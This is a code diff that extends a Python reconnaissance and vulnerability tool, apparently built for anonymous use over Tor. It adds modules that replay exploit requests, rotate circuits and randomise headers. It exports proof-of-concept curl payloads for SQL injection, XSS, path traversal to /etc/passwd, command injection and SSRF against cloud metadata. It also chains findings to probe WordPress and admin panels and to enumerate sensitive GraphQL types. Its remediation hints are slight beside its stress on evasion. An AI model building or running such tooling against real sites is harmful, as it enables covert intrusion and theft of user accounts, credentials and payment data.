@@ -1658,6 +1658,562 @@ class SecureStorage:
 
 
 # ══════════════════════════════════════════════════════════════════════════
+#  Request Capture — records every request/response for replay & PoC export
+# ══════════════════════════════════════════════════════════════════════════
+
+class CapturedRequest:
+    """Immutable record of an HTTP request/response pair."""
+    __slots__ = ("method", "url", "headers", "body", "status_code",
+                 "response_headers", "response_body_hash", "response_length",
+                 "timestamp", "tor_circuit_id")
+
+    def __init__(self, method: str, url: str, headers: dict, body: str,
+                 status_code: int, resp_headers: dict, resp_body: str):
+        self.method = method
+        self.url = url
+        self.headers = dict(headers)
+        self.body = body or ""
+        self.status_code = status_code
+        self.response_headers = dict(resp_headers) if resp_headers else {}
+        self.response_body_hash = hashlib.sha256(resp_body.encode()[:10000]).hexdigest()[:16] if resp_body else ""
+        self.response_length = len(resp_body) if resp_body else 0
+        self.timestamp = int(time.time()) // 600 * 600
+        self.tor_circuit_id = secrets.token_hex(4)
+
+    def to_curl(self, redact: bool = True) -> str:
+        """Generate a curl command that reproduces this request.
+
+        OPSEC: redacts cookies, auth headers, and API keys by default.
+        """
+        parts = ["curl"]
+        if self.method != "GET":
+            parts.append(f"-X {self.method}")
+        parts.append("--socks5-hostname 127.0.0.1:9050")
+        for k, v in self.headers.items():
+            if redact and k.lower() in ("cookie", "authorization", "hibp-api-key"):
+                v = "[REDACTED]"
+            parts.append(f'-H "{k}: {v}"')
+        if self.body:
+            safe_body = self.body if not redact else re.sub(
+                r'(password|token|key|secret)(["\s:=]+)([^\s"&]+)',
+                r'\1\2[REDACTED]', self.body, flags=re.I)
+            parts.append(f"-d '{safe_body}'")
+        parts.append(f'"{self.url}"')
+        return " \\\n  ".join(parts)
+
+    def to_raw_http(self, redact: bool = True) -> str:
+        """Generate raw HTTP request format."""
+        parsed = urlparse(self.url)
+        path = parsed.path or "/"
+        if parsed.query:
+            path += f"?{parsed.query}"
+        lines = [f"{self.method} {path} HTTP/1.1"]
+        lines.append(f"Host: {parsed.netloc}")
+        for k, v in self.headers.items():
+            if k.lower() == "host":
+                continue
+            if redact and k.lower() in ("cookie", "authorization", "hibp-api-key"):
+                v = "[REDACTED]"
+            lines.append(f"{k}: {v}")
+        if self.body:
+            lines.append("")
+            lines.append(self.body if not redact else "[body redacted]")
+        return "\r\n".join(lines)
+
+    def to_dict(self) -> dict:
+        return {
+            "method": self.method, "url": self.url,
+            "status": self.status_code,
+            "response_hash": self.response_body_hash,
+            "response_length": self.response_length,
+        }
+
+
+class RequestLog:
+    """Thread-safe log of captured requests for a scan session."""
+
+    def __init__(self):
+        self._requests: List[CapturedRequest] = []
+
+    def capture(self, method: str, url: str, headers: dict, body: str,
+                resp: Optional[requests.Response]) -> CapturedRequest:
+        """Record a request/response pair."""
+        cr = CapturedRequest(
+            method=method, url=url, headers=headers, body=body or "",
+            status_code=resp.status_code if resp else 0,
+            resp_headers=dict(resp.headers) if resp else {},
+            resp_body=resp.text[:50000] if resp else "",
+        )
+        self._requests.append(cr)
+        return cr
+
+    def get_for_url(self, url: str) -> List[CapturedRequest]:
+        return [r for r in self._requests if r.url == url]
+
+    def get_all(self) -> List[CapturedRequest]:
+        return list(self._requests)
+
+    def clear(self):
+        self._requests.clear()
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  Exploit Verifier — replays requests, diffs responses, adjusts confidence
+# ══════════════════════════════════════════════════════════════════════════
+
+class ExploitVerifier:
+    """Replay exploit requests and verify findings are real.
+
+    For each exploitable finding:
+    1. Replay the original request through a new Tor circuit
+    2. Compare response to original (hash, length, key indicators)
+    3. If response matches → confirmed (confidence stays/increases)
+    4. If response differs significantly → lower confidence
+    5. If request fails → mark as unverified
+    """
+
+    def __init__(self, session: TorSession, request_log: RequestLog):
+        self._session = session
+        self._log = request_log
+
+    def verify_finding(self, finding: dict) -> dict:
+        """Verify a single finding by replaying its request.
+
+        Returns the finding with updated confidence and verification status.
+        """
+        ei = finding.get("exploit_info", {})
+        if not ei:
+            finding["verified"] = "no_exploit_info"
+            return finding
+
+        # Rotate circuit before replay for clean state
+        newnym()
+        time.sleep(2 + secrets.randbelow(3000) / 1000.0)
+
+        exploit_type = ei.get("type", "")
+        original_conf = finding.get("confidence", 0.5)
+
+        # Find the original request for this finding
+        evidence = finding.get("evidence", "")
+
+        # Build replay URL from exploit info
+        replay_url = self._build_replay_url(finding)
+        if not replay_url:
+            finding["verified"] = "cannot_build_replay"
+            return finding
+
+        # Execute replay
+        try:
+            if exploit_type == "graphql_introspection":
+                resp = self._session._session.post(
+                    replay_url,
+                    json={"query": "{ __schema { types { name } } }"},
+                    timeout=15, proxies=self._session._proxy,
+                    headers=_pick_profile(),
+                )
+            else:
+                resp = self._session.get(replay_url, allow_wayback=False)
+
+            if resp is None:
+                finding["verified"] = "replay_failed"
+                finding["confidence"] = max(original_conf - 0.2, 0.1)
+                return finding
+
+            # Verify based on exploit type
+            confirmed = self._check_replay_result(exploit_type, resp, finding)
+            if confirmed:
+                finding["verified"] = "confirmed"
+                finding["confidence"] = min(original_conf + 0.05, 1.0)
+            else:
+                finding["verified"] = "not_reproduced"
+                finding["confidence"] = max(original_conf - 0.3, 0.1)
+
+        except Exception as e:
+            finding["verified"] = f"error:{type(e).__name__}"
+            finding["confidence"] = max(original_conf - 0.15, 0.1)
+            integrity_log("intel", f"verify_error:{exploit_type}:{type(e).__name__}")
+
+        return finding
+
+    def _build_replay_url(self, finding: dict) -> Optional[str]:
+        """Build the replay URL from finding metadata."""
+        ei = finding.get("exploit_info", {})
+        evidence = finding.get("evidence", "")
+
+        # Extract base URL from evidence
+        url_match = re.search(r"https?://[^\s,)]+", evidence)
+        if url_match:
+            return url_match.group(0)
+
+        # Build from exploit info
+        param = ei.get("parameter", "")
+        path = ei.get("path", "")
+        if path:
+            # Reconstruct from path (sensitive file checks)
+            # Need base URL — look for it in the finding
+            return None
+
+        return None
+
+    def _check_replay_result(self, exploit_type: str, resp: requests.Response,
+                              finding: dict) -> bool:
+        """Check if replay response confirms the finding."""
+        text = resp.text[:10000] if resp.text else ""
+
+        if exploit_type == "sqli":
+            for pat in VulnScanner.SQLI_INDICATORS:
+                if pat.search(text):
+                    return True
+
+        elif exploit_type == "xss":
+            canary = finding.get("evidence", "")
+            canary_match = re.search(r"<(gs[a-f0-9]+test)>", canary)
+            if canary_match and f"<{canary_match.group(1)}>" in text:
+                return True
+
+        elif exploit_type == "lfi":
+            if re.search(r"root:.*:0:0:", text):
+                return True
+
+        elif exploit_type == "command_injection":
+            # Check for any echo marker pattern
+            if re.search(r"gs[a-f0-9]{8}(rce|verify)", text):
+                return True
+
+        elif exploit_type == "graphql_introspection":
+            try:
+                data = resp.json()
+                if data.get("data", {}).get("__schema"):
+                    return True
+            except (ValueError, AttributeError):
+                pass
+
+        elif exploit_type == "ssrf":
+            aws_indicators = ["ami-id", "instance-id", "instance-type"]
+            matches = sum(1 for ind in aws_indicators if ind in text.lower())
+            if matches >= 2:
+                return True
+
+        elif exploit_type == "subdomain_takeover":
+            fingerprint = finding.get("exploit_info", {}).get("cname", "")
+            # If the page still shows the unclaimed-resource error, it's still exploitable
+            return resp.status_code in (404, 200) and len(text) < 5000
+
+        return False
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  PoC Exporter — generate actionable exploit proof-of-concepts
+# ══════════════════════════════════════════════════════════════════════════
+
+class PoCExporter:
+    """Export exploitable findings as actionable PoC commands.
+
+    All exports are OPSEC-safe by default:
+    - Cookies, auth headers, API keys redacted
+    - All commands route through Tor (--socks5-hostname)
+    - No real target identifiers in filenames
+    """
+
+    @staticmethod
+    def export_finding(finding: dict, redact: bool = True) -> dict:
+        """Export a single finding as multiple PoC formats."""
+        ei = finding.get("exploit_info", {})
+        exploit_type = ei.get("type", "unknown")
+        param = ei.get("parameter", "")
+        path = ei.get("path", "")
+
+        poc = {
+            "finding": finding.get("title", ""),
+            "severity": finding.get("severity", ""),
+            "confidence": finding.get("confidence", 0),
+            "verified": finding.get("verified", "unverified"),
+            "curl": "",
+            "description": "",
+            "remediation": "",
+        }
+
+        # Generate PoC based on exploit type
+        if exploit_type == "sqli" and param:
+            poc["curl"] = (
+                f"curl --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]?{param}=1\'"'
+            )
+            poc["description"] = (
+                f"SQL injection via '{param}' parameter. "
+                f"Send a single quote to trigger SQL error messages."
+            )
+            poc["remediation"] = "Use parameterized queries / prepared statements."
+
+        elif exploit_type == "xss" and param:
+            poc["curl"] = (
+                f"curl --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]?{param}=<script>alert(1)</script>"'
+            )
+            poc["description"] = (
+                f"Reflected XSS via '{param}' parameter. "
+                f"HTML tags reflected unescaped in response."
+            )
+            poc["remediation"] = "HTML-encode all user input in output context."
+
+        elif exploit_type == "lfi" and param:
+            poc["curl"] = (
+                f"curl --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]?{param}=..%2F..%2F..%2Fetc%2Fpasswd"'
+            )
+            poc["description"] = (
+                f"Local file inclusion via '{param}'. "
+                f"Arbitrary server files readable."
+            )
+            poc["remediation"] = "Whitelist allowed file paths. Never pass user input to file operations."
+
+        elif exploit_type == "command_injection" and param:
+            poc["curl"] = (
+                f"curl --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]?{param}=;id"'
+            )
+            poc["description"] = (
+                f"OS command injection via '{param}'. "
+                f"Arbitrary commands execute on the server."
+            )
+            poc["remediation"] = "Never pass user input to shell commands. Use safe APIs."
+
+        elif exploit_type == "ssrf" and param:
+            poc["curl"] = (
+                f"curl --socks5-hostname 127.0.0.1:9050 "
+                f'"[TARGET_URL]?{param}=http://169.254.169.254/latest/meta-data/"'
+            )
+            poc["description"] = (
+                f"SSRF via '{param}'. Server fetches attacker-controlled URLs."
+            )
+            poc["remediation"] = "Validate and whitelist allowed URL destinations."
+
+        elif exploit_type == "graphql_introspection" and path:
+            poc["curl"] = (
+                f'curl --socks5-hostname 127.0.0.1:9050 '
+                f'-X POST -H "Content-Type: application/json" '
+                f'-d \'{{"query": "{{ __schema {{ types {{ name }} }} }}"}}\' '
+                f'"[TARGET_URL]{path}"'
+            )
+            poc["description"] = "GraphQL introspection enabled. Full API schema exposed."
+            poc["remediation"] = "Disable introspection in production."
+
+        elif exploit_type == "subdomain_takeover":
+            cname = ei.get("cname", "")
+            service = ei.get("service", "")
+            poc["curl"] = f"# Register unclaimed resource on {service} pointing to {cname}"
+            poc["description"] = (
+                f"CNAME points to unclaimed {service} resource. "
+                f"Attacker can claim it and serve content on the subdomain."
+            )
+            poc["remediation"] = "Remove dangling CNAME record or claim the resource."
+
+        else:
+            poc["curl"] = "# Manual verification required"
+            poc["description"] = finding.get("detail", "")
+            poc["remediation"] = "See finding detail."
+
+        return poc
+
+    @staticmethod
+    def export_all(findings: List[dict], redact: bool = True) -> List[dict]:
+        """Export all exploitable findings."""
+        pocs = []
+        for f in findings:
+            if f.get("exploitable"):
+                pocs.append(PoCExporter.export_finding(f, redact))
+        return pocs
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  Finding Chain — links related findings for targeted exploitation
+# ══════════════════════════════════════════════════════════════════════════
+
+class FindingChain:
+    """Detect relationships between findings and chain them.
+
+    Pipeline: extract → enrich → test
+    Example chains:
+    - Server version disclosed → search for CVEs for that version
+    - WordPress detected → check WP-specific vulns
+    - Admin panel found → test default credentials
+    - API endpoint found → test for auth bypass
+    """
+
+    # Chain rules: if finding A exists, check for finding B
+    CHAIN_RULES = [
+        {
+            "trigger": lambda f: f.get("title", "").startswith("Server version"),
+            "action": "version_cve_lookup",
+            "description": "Server version disclosed → check known CVEs",
+        },
+        {
+            "trigger": lambda f: "WordPress" in str(f.get("evidence", "")),
+            "action": "wordpress_deep_scan",
+            "description": "WordPress detected → check WP-specific endpoints",
+        },
+        {
+            "trigger": lambda f: "Admin panel" in f.get("title", ""),
+            "action": "admin_panel_check",
+            "description": "Admin panel found → check for default paths",
+        },
+        {
+            "trigger": lambda f: "GraphQL" in f.get("title", ""),
+            "action": "graphql_enum",
+            "description": "GraphQL found → enumerate sensitive queries",
+        },
+        {
+            "trigger": lambda f: f.get("severity") == SEV_CRITICAL and f.get("exploitable"),
+            "action": "critical_exploit_verify",
+            "description": "Critical exploitable finding → auto-verify",
+        },
+    ]
+
+    WP_EXTRA_PATHS = [
+        "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
+        "/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
+        "/wp-content/uploads/", "/wp-content/debug.log",
+    ]
+
+    def __init__(self, session: TorSession, scanner: VulnScanner):
+        self._session = session
+        self._scanner = scanner
+
+    def process_chains(self, findings: List[dict], base_url: str,
+                       tech: dict) -> List[dict]:
+        """Process chain rules against existing findings.
+
+        Returns NEW findings discovered through chaining.
+        """
+        new_findings = []
+
+        for rule in self.CHAIN_RULES:
+            triggered = [f for f in findings if rule["trigger"](f)]
+            if not triggered:
+                continue
+
+            action = rule["action"]
+            integrity_log("intel", f"chain_triggered:{action}")
+
+            if action == "wordpress_deep_scan":
+                new_findings.extend(self._wp_deep_scan(base_url))
+            elif action == "admin_panel_check":
+                new_findings.extend(self._admin_check(base_url))
+            elif action == "graphql_enum":
+                new_findings.extend(self._graphql_enum(base_url, triggered[0]))
+
+        # Also chain based on tech fingerprint
+        if "WordPress" in tech.get("cms", []):
+            wp_findings = self._wp_deep_scan(base_url)
+            new_findings.extend(wp_findings)
+
+        return new_findings
+
+    def _wp_deep_scan(self, base_url: str) -> List[dict]:
+        """WordPress-specific vulnerability checks."""
+        findings = []
+        for wp_path in self.WP_EXTRA_PATHS:
+            if shutdown_requested():
+                break
+            url = urljoin(base_url, wp_path)
+            resp = self._session.get(url, allow_wayback=False, method="HEAD")
+            if resp and resp.status_code == 200:
+                sev = SEV_HIGH if "debug.log" in wp_path or "xmlrpc" in wp_path else SEV_MEDIUM
+                findings.append({
+                    "severity": sev,
+                    "title": f"WordPress path accessible: {wp_path}",
+                    "detail": f"WordPress endpoint found at {wp_path}.",
+                    "evidence": f"HTTP 200 at {wp_path}",
+                    "confidence": 0.8,
+                    "chain_source": "wordpress_deep_scan",
+                })
+                if "xmlrpc" in wp_path:
+                    findings[-1]["exploitable"] = True
+                    findings[-1]["exploit_info"] = {
+                        "type": "xmlrpc_abuse",
+                        "path": wp_path,
+                        "method": "XML-RPC can be used for brute-force amplification, "
+                                  "pingback SSRF, and DoS. Test with: "
+                                  "POST system.listMethods to enumerate available methods.",
+                        "risk": "Brute-force, SSRF via pingback, denial of service",
+                    }
+        return findings
+
+    def _admin_check(self, base_url: str) -> List[dict]:
+        """Check admin panel for common patterns."""
+        findings = []
+        admin_paths = ["/admin/login", "/administrator/", "/wp-admin/",
+                       "/admin/dashboard", "/panel/"]
+        for path in admin_paths:
+            if shutdown_requested():
+                break
+            resp = self._session.get(urljoin(base_url, path), allow_wayback=False)
+            if resp and resp.status_code == 200 and len(resp.text) > 500:
+                if re.search(r"<form.*(?:login|password|user)", resp.text[:5000], re.I):
+                    findings.append({
+                        "severity": SEV_MEDIUM,
+                        "title": f"Admin login form at {path}",
+                        "detail": "Login form accessible. Test for default credentials.",
+                        "evidence": f"Login form at {path}",
+                        "confidence": 0.85,
+                        "chain_source": "admin_panel_check",
+                    })
+                    break
+        return findings
+
+    def _graphql_enum(self, base_url: str, gql_finding: dict) -> List[dict]:
+        """Enumerate sensitive GraphQL queries from schema."""
+        findings = []
+        path = gql_finding.get("exploit_info", {}).get("path", "/graphql")
+        url = urljoin(base_url, path)
+
+        # Full introspection query to find sensitive types
+        query = '{ __schema { types { name fields { name type { name } } } } }'
+        try:
+            resp = self._session._session.post(
+                url, json={"query": query}, timeout=15,
+                proxies=self._session._proxy, headers=_pick_profile(),
+            )
+            if resp and resp.status_code == 200:
+                data = resp.json()
+                types = data.get("data", {}).get("__schema", {}).get("types", [])
+                sensitive_types = []
+                for t in types:
+                    name = t.get("name", "")
+                    if name and not name.startswith("__"):
+                        # Flag types that look sensitive
+                        if any(kw in name.lower() for kw in
+                               ["user", "account", "admin", "secret", "token",
+                                "password", "credential", "payment", "order"]):
+                            fields = [f.get("name", "") for f in t.get("fields", [])[:10]]
+                            sensitive_types.append({"type": name, "fields": fields})
+
+                if sensitive_types:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"GraphQL exposes {len(sensitive_types)} sensitive types",
+                        "detail": "Types: " + ", ".join(s["type"] for s in sensitive_types[:5]),
+                        "evidence": json.dumps(sensitive_types[:3], default=str)[:200],
+                        "confidence": 0.9,
+                        "exploitable": True,
+                        "exploit_info": {
+                            "type": "graphql_data_exposure",
+                            "path": path,
+                            "method": "Query sensitive types directly: " +
+                                      ", ".join(f'{{ {s["type"].lower()}s {{ ' +
+                                               " ".join(s["fields"][:5]) + ' } }}'
+                                               for s in sensitive_types[:2]),
+                            "risk": "Data exfiltration of user accounts, credentials, payments",
+                        },
+                        "chain_source": "graphql_enum",
+                    })
+        except Exception as e:
+            integrity_log("intel", f"graphql_enum_error:{type(e).__name__}")
+
+        return findings
+
+
+# ══════════════════════════════════════════════════════════════════════════
 #  Web Scraper / Intel Collector
 # ══════════════════════════════════════════════════════════════════════════
 
@@ -1748,12 +2304,15 @@ class IntelOrchestrator:
 
     def __init__(self, proxy: dict, scan_depth: str = "full"):
         self._session = TorSession(proxy)
+        self._request_log = RequestLog()
         self._scraper = IntelScraper(self._session)
         self._vulns = VulnScanner(self._session)
         self._breach = BreachChecker(self._session)
         self._subdomains = SubdomainEnumerator(self._session)
         self._dns = DNSRecon(self._session)
         self._tech = TechFingerprinter()
+        self._chain = FindingChain(self._session, self._vulns)
+        self._verifier = ExploitVerifier(self._session, self._request_log)
         self._storage = SecureStorage()
         self._results: List[dict] = []
         self._vuln_findings: List[dict] = []
@@ -1838,6 +2397,31 @@ class IntelOrchestrator:
             if shutdown_requested():
                 break
             self._run_search(dq, max_results=10)
+
+        # Phase 7: Finding chaining (use discoveries to find more)
+        if self._scan_depth in ("full", "deep") and self._vuln_findings:
+            print(f"\n  [*] Phase 7: Finding chain analysis...")
+            chain_findings = self._chain.process_chains(
+                self._vuln_findings, base_url, tech)
+            if chain_findings:
+                self._vulns._add_confidence(chain_findings, 0.8)
+                self._vuln_findings.extend(chain_findings)
+                print(f"  [+] Chain analysis found {len(chain_findings)} additional findings")
+                self._print_vulns(chain_findings)
+
+        # Phase 8: Verify exploitable findings (deep only)
+        if self._scan_depth == "deep":
+            exploitable = [f for f in self._vuln_findings if f.get("exploitable")]
+            if exploitable:
+                print(f"\n  [*] Phase 8: Verifying {len(exploitable)} exploitable findings...")
+                for ef in exploitable:
+                    if shutdown_requested():
+                        break
+                    self._verifier.verify_finding(ef)
+                    status = ef.get("verified", "?")
+                    conf = ef.get("confidence", 0)
+                    tag = "✓" if status == "confirmed" else "✗" if "not_reproduced" in status else "?"
+                    print(f"      {tag} {ef['title'][:50]} → {status} ({conf*100:.0f}%)")
 
     def run_email(self, email: str):
         """Breach database check for email."""
@@ -2018,6 +2602,7 @@ class IntelOrchestrator:
                 "data_extracted": {k: len(v) for k, v in all_data.items()},
             },
             "vulnerabilities": self._vuln_findings,
+            "proof_of_concepts": PoCExporter.export_all(self._vuln_findings),
             "results": [
                 {k: v for k, v in r.items() if k not in ("raw_html", "raw_headers")}
                 for r in self._results
@@ -2043,6 +2628,16 @@ class IntelOrchestrator:
             for k, v in sorted(all_data.items()):
                 if v:
                     print(f"    {k}: {len(v)}")
+        pocs = PoCExporter.export_all(self._vuln_findings)
+        if pocs:
+            print(f"  PoC commands:       {len(pocs)} (in report)")
+        verified = [v for v in self._vuln_findings if v.get("verified") == "confirmed"]
+        unverified = [v for v in self._vuln_findings
+                      if v.get("exploitable") and v.get("verified") != "confirmed"]
+        if verified:
+            print(f"  Verified exploits:  {len(verified)}")
+        if unverified:
+            print(f"  Unverified:         {len(unverified)}")
         print(f"  {'═' * 55}")
         if enc_key:
             print(f"  [+] Report saved (encrypted): {scrub_path(outpath)}")
